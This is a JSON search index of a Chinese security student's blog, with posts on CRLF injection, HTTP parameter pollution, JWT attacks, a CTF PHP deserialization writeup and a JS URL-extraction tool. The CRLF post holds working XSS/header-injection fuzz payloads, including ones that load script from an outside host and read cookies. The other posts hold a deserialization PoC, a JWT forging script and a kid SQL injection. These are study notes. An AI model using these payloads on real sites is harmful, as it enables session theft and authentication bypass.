{"pages":[{"title":"About Me","text":"Welcome to my blogThis is Threezh1 Introduction&#x4F60;&#x597D;&#xFF0C;&#x6B22;&#x8FCE;&#x6765;&#x5230;&#x6211;&#x7684;&#x535A;&#x5BA2;&#x3002;&#x4F60;&#x53EF;&#x4EE5;&#x53EB;&#x6211; &#x4E09;&#x4E4B; (Threezh1)&#xFF0C;&#x73B0;&#x5728;&#x6210;&#x90FD;&#x4FE1;&#x606F;&#x5DE5;&#x7A0B;&#x5927;&#x5B66;&#x4FE1;&#x606F;&#x5B89;&#x5168;&#x4E13;&#x4E1A;&#x5927;&#x4E8C;&#x5728;&#x8BFB;&#x3001;D0g3&#x9053;&#x683C;&#x5B89;&#x5168;&#x5B9E;&#x9A8C;&#x5BA4;&#x6210;&#x5458;&#x3002; &#x4F1A;&#x4E00;&#x70B9;&#x70B9;&#xFF1A;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x3001;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x3001;CTF&#x3001;&#x9020;&#x8F6E;&#x5B50; &#x6BD4;&#x8F83;&#x559C;&#x6B22;&#xFF1A;&#x5212;&#x6C34;&#x3001;&#x6ED1;&#x677F;&#x3001;&#x6444;&#x5F71;&#x3001;&#x5230;&#x5904;&#x8D70;&#x8D70; QQ2759762029 | makefoxm@qq.com | GitHub | Weibo Working Node.js&#x3001;Go&#x8BED;&#x8A00;&#x7684;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1; &#x81EA;&#x52A8;&#x5316;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x6784;&#x601D;&#x4E2D; &#x6784;&#x5EFA;&#x77E5;&#x8BC6;&#x5E93; My Friends 0aKarmA hu3sky Passer6y Patrilic ku3n y1nhui bak6ry fdrag0n Xun9er p2hm1n","link":"/About/index.html"},{"title":"Photography","text":"Introduction&#x6444;&#x5F71;&#x7684;&#x9875;&#x9762;&#x8FD8;&#x5728;&#x6784;&#x601D;&#x5F53;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x53BB;&#x5FAE;&#x535A;&#x770B;&#x770B;&#xFF1A;Weibo","link":"/Photography/index.html"},{"title":"Project","text":"Introduction&#x5C06;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x4E00;&#x4E9B;&#x8F6E;&#x5B50;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x3002; JSFinder JSFinder&#x662F;&#x4E00;&#x6B3E;&#x7528;&#x4F5C;&#x5FEB;&#x901F;&#x5728;&#x7F51;&#x7AD9;&#x7684;js&#x6587;&#x4EF6;&#x4E2D;&#x63D0;&#x53D6;URL&#xFF0C;&#x5B50;&#x57DF;&#x540D;&#x7684;&#x5DE5;&#x5177; SiteCopy sitecopy&#x662F;&#x4E00;&#x6B3E;&#x53EF;&#x5BF9;&#x4E2A;&#x4EBA;&#x7F51;&#x7AD9;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x548C;&#x7F51;&#x7EDC;&#x6570;&#x636E;&#x6536;&#x96C6;&#x7684;&#x5DE5;&#x5177; SubdomainFinder SubdomainFinder&#x662F;&#x7528;&#x4E8E;&#x6536;&#x96C6;&#x5B50;&#x57DF;&#x7684;&#x5DE5;&#x5177; Planning JSFinder 2.0 &#x81EA;&#x52A8;&#x5316;&#x6F0F;&#x6D1E;&#x6316;&#x6398;&#x7CFB;&#x5217; &#x8FB9;&#x5B66;&#x8FB9;&#x5199;&#xFF0C;&#x6162;&#x6162;&#x6765;&#x2026;","link":"/Projects/index.html"},{"title":"Life","text":"Introduction&#x751F;&#x6D3B;&#x7684;&#x7BC7;&#x7AE0;&#x8FD8;&#x672A;&#x5F00;&#x59CB;&#x2026;","link":"/Life/index.html"}],"posts":[{"title":"了解CRLF","text":"Simple note:CRLF: Carriage-Return Line-Feend. Use CR, ASCII 13 \\r (&#x56DE;&#x8F66;) , LF, ASCII 10, \\n and %0d%0a to break the HTTP request. In the penetration test, if we found a request is like this: 123GET /test/demo.php?url=https://www.threezh1.comThat we can contral..... If the HTTP Header of the request return with the response, which means we can control the HTTP Header.(Of course include the Url.) 1234567HTTP/1.1 200 OKConnection: keep-aliveContent-Encoding: deflate...That we can contral....Locations=https://www.threezh1.com Then we can further test the request, change the parameter url to %0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt; Equivalent to the following 123456789Content-Length: 0HTTP/1.1 200 OKContent-Type: text/htmlContent-Length:%2047&lt;script&gt;alert(1)&lt;/script&gt;or you can chose add a picture: &lt;img src=1&gt; If the window pops up successfully, there is a CRLF. Tips:When the xss is intercepted, you can add X-XSS-Protection:0 to bypass. And if you meet with a CRLF, there are some filters, you can fuzz the point with the disc of C1h2e1. FUZZ: 1234567891011121314151617181920%0d%0a%0d%0a%0d%0ar%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a&lt;html&gt;Injected%02Content&lt;/html&gt;%0d%0d%0a%0a0x0D0x0A0x0D0x0D0x0A0x0A\\r\\n%5cr%5cn%0%0d%0ad%0%0d%0aa%0%0D%0AD%0%0D%0AA%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E Reference C1h2e1 CRLF Injection&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#x4E0E;&#x5B9E;&#x4F8B;&#x5206;&#x6790;","link":"/2019/01/01/CRLF/"},{"title":"2019全国大学生信息安全竞赛反序列化题目复现","text":"Web - Justsoso&#x4F7F;&#x7528;php&#x4F2A;&#x534F;&#x8BAE;&#x8BFB;&#x5230;hint&#x548C;index&#x7684;&#x6E90;&#x7801;&#xFF1A; /index.php?file=php://filter/read=convert.base64-encode/resource=hint.php index.php: 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$file = $_GET[&quot;file&quot;];$payload = $_GET[&quot;payload&quot;]; if (!isset($file)) { echo &apos;Missing parameter&apos; . &apos;&lt;br&gt;&apos;;} if (preg_match(&quot;/flag/&quot;, $file)) { die(&apos;hack attacked!!!&apos;);} @include ($file);if (isset($payload)) { $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]); parse_str($url[&apos;query&apos;], $query); foreach ($query as $value) { if (preg_match(&quot;/flag/&quot;, $value)) { die(&apos;stop hacking!&apos;); exit(); } } $payload = unserialize($payload);} else { echo &quot;Missing parameters&quot;;}?&gt; hint.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass Handle { private $handle; public function __wakeup() { foreach (get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking upn&quot;; } public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct() { $this-&gt;handle-&gt;getFlag(); }} class Flag { public $file; public $token; public $token_flag; function __construct($file) { $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1, 10000)); } public function getFlag() { $this-&gt;token_flag = md5(rand(1, 10000)); if ($this-&gt;token === $this-&gt;token_flag) { if (isset($this-&gt;file)) { echo @highlight_file($this-&gt;file, true); } } }}?&gt; &#x5206;&#x6790;index.php (&#x53C2;&#x6570;file, payload&#x90FD;&#x88AB;&#x5B9A;&#x4E49;) file&#x53C2;&#x6570;&#x4E2D;&#x8BFB;&#x5230;flag&#x5C31;&#x62E6;&#x622A; &#x4F7F;&#x7528;parse_url&#x89E3;&#x6790;&#x5F53;&#x524D;URL&#x7684;&#x8DEF;&#x5F84; &#x7EE7;&#x7EED;&#x5339;&#x914D;flag&#x5E76;&#x62E6;&#x622A; &#x5168;&#x90E8;&#x901A;&#x8FC7;&#x4E86;&#x4E4B;&#x540E;&#x53CD;&#x5E8F;&#x5217;&#x5316;payload&#x53C2;&#x6570;&#x7684;&#x503C; &#x5206;&#x6790;hint.php class Handle&#xFF1A; __wakeup() &#x5C06;&#x6240;&#x6709;&#x53D8;&#x91CF;&#x90FD;&#x8D4B;&#x503C;&#x4E3A;&#x7A7A; __construct($handle) &#x5C06;$handle&#x7684;&#x503C;&#x8D4B;&#x503C;&#x7ED9;$this-&gt;handle __destruct() &#x8C03;&#x7528;getFlag(); class Flag&#xFF1A; __construct($file) &#x5C06;$file&#x8D4B;&#x503C;&#x7ED9;$this-&gt;file&#xFF0C;token_flag&#xFF0C;token&#x90FD;&#x8D4B;&#x503C;&#x4E3A;1-10000&#x540C;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x6570;&#x5B57;&#x7684;md5&#x503C;&#x3002; getFlag() token_flah&#x88AB;&#x8D4B;&#x503C;&#x4E3A;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x968F;&#x673A;&#x6570;md5&#x503C;&#xFF0C;&#x5224;&#x65AD;token&#x548C;token_flag&#x662F;&#x5426;&#x4E00;&#x81F4;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x81F4;&#xFF0C;&#x518D;&#x5224;&#x65AD;$this-&gt;file&#x662F;&#x5426;&#x88AB;&#x5B9A;&#x4E49;&#xFF0C;&#x5982;&#x679C;&#x5B9A;&#x4E49;&#xFF0C;&#x518D;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x3002;&#x5373;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;flag&#x3002; &#x76EE;&#x7684;&#xFF1A; &#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6784;&#x9020;&#x4E00;&#x4E2A;poc&#xFF0C;&#x5B9A;&#x4E49;$file&#xFF0C;&#x8BFB;&#x53D6;&#x5230;flag&#x3002; &#x8FD9;&#x91CC;&#x6709;&#x51E0;&#x5904;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x5730;&#x65B9;&#xFF1A; &#x9700;&#x8981;&#x7ED5;&#x8FC7;parse_url&#x4F7F;flag&#x5B57;&#x7B26;&#x80FD;&#x591F;&#x88AB;&#x4F20;&#x9012;&#x8FDB;&#x6765;&#x3002; __wakeup()&#x6E05;&#x7A7A;&#x4E86;&#x6240;&#x6709;&#x53D8;&#x91CF;&#xFF0C;&#x9700;&#x8981;&#x7ED5;&#x8FC7;&#x3002; &#x5982;&#x4F55;&#x4F7F;token&#x548C;token_flag&#x7684;&#x503C;&#x5728;getFlag()&#x5904;&#x76F8;&#x7B49; &#x6784;&#x9020;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF1A; &#x8FD9;&#x91CC;&#x6211;&#x76F4;&#x63A5;&#x590D;&#x5236;&#x4E86;&#x53C2;&#x8003;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x7684;&#x6784;&#x9020;&#x6E90;&#x7801;&#x3002; 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking upn&quot;; } public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){ $this-&gt;handle-&gt;getFlag(); } } class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); } public function getFlag(){ if(isset($this-&gt;file)){ echo @highlight_file($this-&gt;file,true); } } }$b = new Flag(&quot;flag.php&quot;); //&#x5148;&#x521B;&#x5EFA;Flag&#x5BF9;&#x8C61;$b-&gt;token=&amp;$b-&gt;token_flag; //&#x5C06;token&#x4F5C;&#x4E3A;token_flag&#x7684;&#x5F15;&#x7528;$a = new Handle($b); //&#x521B;&#x5EFA;Handle&#x5BF9;&#x8C61;,&#x5C06;Flag&#x5BF9;&#x8C61;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x4F20;&#x9012;&#x8FDB;&#x53BB;&#xFF0C;&#x8FDB;&#x800C;&#x53EF;&#x4EE5;&#x8C03;&#x7528;getFlag()&#x65B9;&#x6CD5;&#x3002;echo(serialize($a)); //&#x6700;&#x540E;&#x5E8F;&#x5217;&#x5316;?&gt; &#x6839;&#x636E;&#x6587;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4E09;&#x4E2A;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x70B9;&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x6CD5;&#x4E3A;&#xFF1A; &#x5229;&#x7528;parse_url&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#xFF0C;&#x5728;&#x57DF;&#x540D;&#x540E;&#x9762;&#x7684;&#x4E00;&#x4E2A;/&#x6539;&#x4E3A;///&#x5373;&#x53EF;&#x7ED5;&#x8FC7; &#x5F53;&#x6210;&#x5458;&#x5C5E;&#x6027;&#x6570;&#x76EE;&#x5927;&#x4E8E;&#x5B9E;&#x9645;&#x6570;&#x76EE;&#x65F6;&#x53EF;&#x7ED5;&#x8FC7;wakeup&#x65B9;&#x6CD5;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5C06;poc&#x91CC;&#x7684;&#xFF1A;O:6:&quot;Handle&quot;:1:{s:... &#x6539;&#x4E3A; O:6:&quot;Handle&quot;:2:{s:... &#x5373;&#x53EF;&#x3002; &#x4F7F;&#x7528;php&#x7684;&#x5F15;&#x7528;&#x8D4B;&#x503C;&#xFF0C;&#x5C06;token&#x4F5C;&#x4E3A;token_flag&#x7684;&#x5F15;&#x7528;&#xFF0C;&#x5F53;token_flag&#x91CD;&#x65B0;&#x88AB;&#x8D4B;&#x503C;&#x65F6;&#xFF0C;token&#x4E5F;&#x4F1A;&#x6539;&#x53D8;&#x3002; &#x6700;&#x540E;&#x7684;poc&#x4E3A;&#xFF1A; http://127.0.0.1///index.php?file=hint.php&amp;payload=O:6:%22Handle%22:2:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:8:%22flag.php%22;s:5:%22token%22;N;s:10:%22token_flag%22;R:4;}} &#x7531;&#x4E8E;&#x9898;&#x76EE;&#x73AF;&#x5883;&#x5DF2;&#x7ECF;&#x4E0D;&#x5728;&#x4E86;&#xFF0C;&#x672C;&#x5730;&#x642D;&#x5EFA;&#x4E86;&#x4E00;&#x4E0B;,parse_url&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x4E0D;&#x51FA;&#x6765;&#xFF0C;&#x4E8E;&#x662F;&#x53EA;&#x80FD;&#x8DF3;&#x8FC7;&#x90A3;&#x4E2A;&#x590D;&#x73B0;&#x4E00;&#x4E0B;&#xFF0C;&#x5982;&#x56FE;&#x3002; &#x9898;&#x76EE;&#x53C2;&#x8003; https://www.anquanke.com/post/id/177039 http://www.cnblogs.com/kagari/p/10758155.html","link":"/2019/04/27/2019全国大学生信息安全竞赛WEB1_Writeuo/"},{"title":"了解HPP","text":"HPP&#x6D4B;&#x8BD5;&#xFF1A;&#x5B58;&#x5728;&#x4E8E;POST,GET&#x4E4B;&#x4E2D;&#x3002; &#x6B65;&#x9AA4;&#xFF1A; page?par1=vall page?par1=HPP_TEST1 page?par1=val1&amp;par1=HPP_TEST1 &#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#xFF1A;https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/ Use to: &#x53D6;&#x4EE3;&#x73B0;&#x6709;&#x7684;&#x7F16;&#x7801;HTTP&#x53C2;&#x6570;&#x3002; &#x66F4;&#x6539;&#x6216;&#x4FEE;&#x6539;&#x9884;&#x671F;/&#x6B63;&#x5E38;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x884C;&#x4E3A;&#x3002; &#x8BBF;&#x95EE;&#x5E76;&#x5229;&#x7528;&#x672A;&#x6B63;&#x786E;&#x63A7;&#x5236;&#x7684;&#x53D8;&#x91CF;&#x3002; &#x7ED5;&#x8FC7;WAF&#x89C4;&#x5219;&#x6216;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x673A;&#x5236;&#x3002; Referer: #BugBounty&#x200A;&#x2014;&#x200A;Compromising User Account- &#x201D;How I was able to compromise user account via HTTP Parameter Pollution(HPP)&#x201D; HTTP Parameter Pollution Subdomain_takeover&#x6D4B;&#x8BD5;&#x4F7F;&#x7528;&#xFF1A;dig nslookup host&#x6765;&#x63A2;&#x6D4B;&#x5B50;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;&#x5730;&#x5740; &#x5BF9;&#x6BD4;&#xFF1A; https://github.com/EdOverflow/can-i-take-over-xyz https://dzone.com/articles/what-are-subdomain-takeovers-how-to-test-and-avoid &#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x6258;&#x7BA1;&#x3002; &#x53EA;&#x80FD;&#x5148;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x5229;&#x7528;&#x53EA;&#x80FD;&#x7B49;&#x540E;&#x9762;&#x9047;&#x5230;&#x518D;&#x8BD5;&#x4E86;&#x3002;","link":"/2019/01/01/HPP_Subdomain_takeover/"},{"title":"JWT备忘录","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x8FD9;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x9047;&#x5230;&#x4E24;&#x6B21;JWT&#x7684;CTF&#x9898;&#xFF0C;&#x672C;&#x60F3;&#x597D;&#x597D;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#xFF0C;&#x7ED3;&#x679C;&#x641C;&#x5230;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x628A;&#x6211;&#x60F3;&#x6574;&#x7406;&#x7684;&#x5168;&#x5199;&#x51FA;&#x6765;&#x4E86;&#x3002; &#x6587;&#x7AE0;&#x5730;&#x5740;&#xFF1A;https://www.anquanke.com/post/id/145540 &#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x53EA;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x5907;&#x5FD8;&#x5F55;&#xFF0C;&#x7B80;&#x5355;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x3002; JWT (JSON Web Token)&#x6700;&#x5E38;&#x7528;&#x7684;&#x7F51;&#x5740;&#xFF1A;https://jwt.io/ JWT&#x7531;&#x4E09;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF1A;Header(&#x5934;&#x90E8;), Payload(&#x8D1F;&#x8F7D;), Signature(&#x7B7E;&#x540D;) &#x683C;&#x5F0F;&#x4E3A;&#xFF1A; Header.Payload.Signature &#x4F8B;&#x5982;&#xFF1A;(HS256) eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c &#x6216; (RS256) eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.POstGetfAytaZS82wHcjoTyoqhMyxXiWdR7Nn7A29DNSl0EiXLdwJ6xC6AfgZWF1bOsS_TuYI3OG85AmiExREkrS6tDfTQ2B3WXlrr-wp5AokiRbz3_oB4OxG-W9KcEEbDRcZc0nH3L7LzYptiy1PtAylQGxHTWZXtGz4ht0bAecBgmpdgXMguEIcoqPJ1n3pIWk_dUZegpqx0Lka21H6XxUTxiy8OcaarA8zdnPUnV6AmNP3ecFawIFYdvJB_cm-GvpCSbr8G8y_Mllj8f4x9nBH8pQux89_6gUY618iYv7tuPWBFfEbLxtF2pZS6YC1aSfLQxeNe8djT9YjpvRZA Header: { &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot; } alg&#x5C5E;&#x6027;&#x8868;&#x793A;&#x7B7E;&#x540D;&#x7684;&#x7B97;&#x6CD5; (&#x9ED8;&#x8BA4;&#x662F; HMAC SHA256 &#x5373;HS256) typ&#x5C5E;&#x6027;&#x8868;&#x793A;&#x8FD9;&#x4E2A;&#x4EE4;&#x724C;&#xFF08;token&#xFF09;&#x7684;&#x7C7B;&#x578B;&#xFF08;type&#xFF09;&#xFF0C;JWT &#x4EE4;&#x724C;&#x7EDF;&#x4E00;&#x5199;&#x4E3A;JWT Payload: { &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true } &#x9664;&#x4E86;&#x5B98;&#x65B9;&#x5B57;&#x6BB5;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x81EA;&#x5B9A;&#x4E49;&#x5B57;&#x6BB5;&#x3002;&#x5982;&#x8FD9;&#x91CC;&#x7684;admin&#x5B57;&#x6BB5;&#x5C31;&#x662F;&#x81EA;&#x5B9A;&#x4E49;&#x5B57;&#x6BB5;&#x3002; Signature: Signature &#x90E8;&#x5206;&#x662F;&#x5BF9;&#x524D;&#x4E24;&#x90E8;&#x5206;&#x7684;&#x7B7E;&#x540D;&#xFF0C;&#x9632;&#x6B62;&#x6570;&#x636E;&#x7BE1;&#x6539;&#x3002; &#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x5BC6;&#x94A5;&#xFF0C;&#x6309;&#x7167;&#x4E0B;&#x9762;&#x7684;&#x7B7E;&#x540D;&#x7B97;&#x6CD5;(&#x9ED8;&#x8BA4;&#x4E3A;HS256)&#x4EA7;&#x751F;&#x7B7E;&#x540D; (RS256&#x6709;&#x4E00;&#x4E2A;&#x516C;&#x94A5;&#x548C;&#x4E00;&#x4E2A;&#x79C1;&#x94A5;) HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) RSASHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), PUBLIC KEY, PRIVATE KEY) &#x7136;&#x540E;&#x5C06;&#x8FD9;&#x4E09;&#x4E2A;&#x90E8;&#x5206;&#x5206;&#x522B;base64&#x7F16;&#x7801;&#x540E;&#x7528;&#x201C;.&#x201D;&#x8FDE;&#x63A5;&#x751F;&#x6210;JSON Web Token &#x8BDD;&#x8BF4;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x7684;&#x540D;&#x5B57;&#x53D6;&#x7684;&#x8FD8;&#x86EE;&#x4E0D;&#x9519;&#x7684;&#x3002; &#x7B97;&#x6CD5;&#x4FEE;&#x6539;&#x653B;&#x51FB;&#x6761;&#x4EF6;&#xFF1A; JWT&#x4F7F;&#x7528;RS256&#x653B;&#x51FB; &#x516C;&#x94A5;&#x53EF;&#x77E5; &#x4E0D;&#x53EF;&#x89E3;&#x5BC6;&#x79C1;&#x94A5;(&#x600E;&#x4E48;&#x89E3;&#x5BC6;&#x4E5F;&#x4E0D;&#x77E5;&#x9053;) &#x5229;&#x7528;&#xFF1A; &#x5C06;&#x516C;&#x94A5;&#x4F5C;&#x4E3A;HS256&#x7684;&#x5BC6;&#x94A5; &#x4F7F;&#x7528;python&#x811A;&#x672C;&#x751F;&#x6210;(&#x7528;jwt.io&#x751F;&#x6210;&#x7684;&#x7528;&#x4E0D;&#x4E86;) 1234import jwtimport base64public = open(&apos;key.txt&apos;, &apos;r&apos;).read()print(jwt.encode({&quot;name&quot;: &quot;name&quot;,&quot;priv&quot;: &quot;admin&quot;}, key=public, algorithm=&apos;HS256&apos;)) &#x62A5;&#x9519;&#x8BF7;&#x53C2;&#x8003;&#x6587;&#x7AE0;&#x5185;&#x7684;&#x89E3;&#x51B3;&#x529E;&#x6CD5; Header&#x5934;&#x4E2D;&#x5B58;&#x5728;kid&#x5B57;&#x6BB5;&#x901A;&#x8FC7;key&#x67E5;&#x8BE2;&#x79C1;&#x94A5;&#x7684;&#x8BED;&#x53E5;&#x7C7B;&#x4F3C;&#x4E8E;&#xFF1A; sql=&quot;select * from table where kid=$kid&quot; &#x5C06;kid&#x4FEE;&#x6539;&#x4E3A;&#xFF1A; kid = 0 union select 12345 &#x6839;&#x636E;&#x73AF;&#x5883;&#x60C5;&#x51B5;&#x4FEE;&#x6539;kid&#x7684;&#x503C;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x5F97;&#x5230;&#x6216;&#x8005;&#x63A7;&#x5236;&#x79C1;&#x94A5;&#x3002; openssl&#x5E38;&#x7528;&#x547D;&#x4EE4; //&#x751F;&#x6210;&#x79C1;&#x94A5; openssl OpenSSL&gt; genrsa -out rsa_private_key.pem 1024 //&#x4EA7;&#x751F;&#x516C;&#x94A5; OpenSSL&gt; rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem writing RSA key &#x5BC6;&#x94A5;&#x7206;&#x7834;HS256&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#x7206;&#x7834; &#x5DE5;&#x5177;&#xFF1A; https://github.com/brendan-rius/c-jwt-cracker &#x4F7F;&#x7528;&#xFF1A; ./jwtcrack &#x52A0;&#x5BC6;&#x503C; &#x4F7F;&#x7528;&#x5B57;&#x5178;&#x7206;&#x7834; &#x5DE5;&#x5177;&#xFF1A; https://github.com/Sjord/jwtcrack &#x4F7F;&#x7528;&#xFF1A; crackjwt.py JWT dictionary.txt &#x53C2;&#x8003; https://www.anquanke.com/post/id/145540 https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/ http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html","link":"/2019/05/17/JWT备忘录/"},{"title":"JSFinder 一个从JS文件中获取url和子域名的工具","text":"&#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;https://github.com/Threezh1/JSFinder &#x5173;&#x4E8E; JSFinderJSFinder is a tool for quickly extracting URLs and subdomains from JS files on a website. JSFinder&#x662F;&#x4E00;&#x6B3E;&#x7528;&#x4F5C;&#x5FEB;&#x901F;&#x5728;&#x7F51;&#x7AD9;&#x7684;js&#x6587;&#x4EF6;&#x4E2D;&#x63D0;&#x53D6;URL&#xFF0C;&#x5B50;&#x57DF;&#x540D;&#x7684;&#x5DE5;&#x5177;&#x3002; &#x63D0;&#x53D6;URL&#x7684;&#x6B63;&#x5219;&#x90E8;&#x5206;&#x4F7F;&#x7528;&#x7684;&#x662F;LinkFinder By : Threezh1 Blog: https://threezh1.github.io/ &#x7528;&#x6CD5; &#x7B80;&#x5355;&#x722C;&#x53D6; python JSFinder.py -u http://www.mi.com &#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x4F1A;&#x722C;&#x53D6; http://www.mi.com &#x8FD9;&#x5355;&#x4E2A;&#x9875;&#x9762;&#x7684;&#x6240;&#x6709;&#x7684;js&#x94FE;&#x63A5;&#xFF0C;&#x5E76;&#x5728;&#x5176;&#x4E2D;&#x53D1;&#x73B0;url&#x548C;&#x5B50;&#x57DF;&#x540D; &#x8FD4;&#x56DE;&#x793A;&#x4F8B;&#xFF1A; 1234567891011121314url:http://www.mi.com Find 50 URL: http://api-order.test.mi.com http://api.order.mi.com http://userid.xiaomi.com/userId http://order.mi.com/site/login?redirectUrl= ...&#x5DF2;&#x7701;&#x7565; Find 26 Subdomain: api-order.test.mi.com api.order.mi.com userid.xiaomi.com order.mi.com ...&#x5DF2;&#x7701;&#x7565; &#x6DF1;&#x5EA6;&#x722C;&#x53D6; python JSFinder.py -u http://www.mi.com -d &#x6DF1;&#x5165;&#x4E00;&#x5C42;&#x9875;&#x9762;&#x722C;&#x53D6;JS&#xFF0C;&#x65F6;&#x95F4;&#x4F1A;&#x6D88;&#x8017;&#x7684;&#x66F4;&#x957F;&#x3002; &#x5EFA;&#x8BAE;&#x4F7F;&#x7528;-ou &#x548C; -os&#x6765;&#x6307;&#x5B9A;&#x4FDD;&#x5B58;URL&#x548C;&#x5B50;&#x57DF;&#x540D;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x4F8B;&#x5982;&#xFF1A; python JSFinder.py -u http://www.mi.com -d -ou mi_url.txt -os mi_subdomain.txt &#x6279;&#x91CF;&#x6307;&#x5B9A;URL/&#x6307;&#x5B9A;JS &#x6307;&#x5B9A;URL&#xFF1A; python JSFinder.py -f text.txt 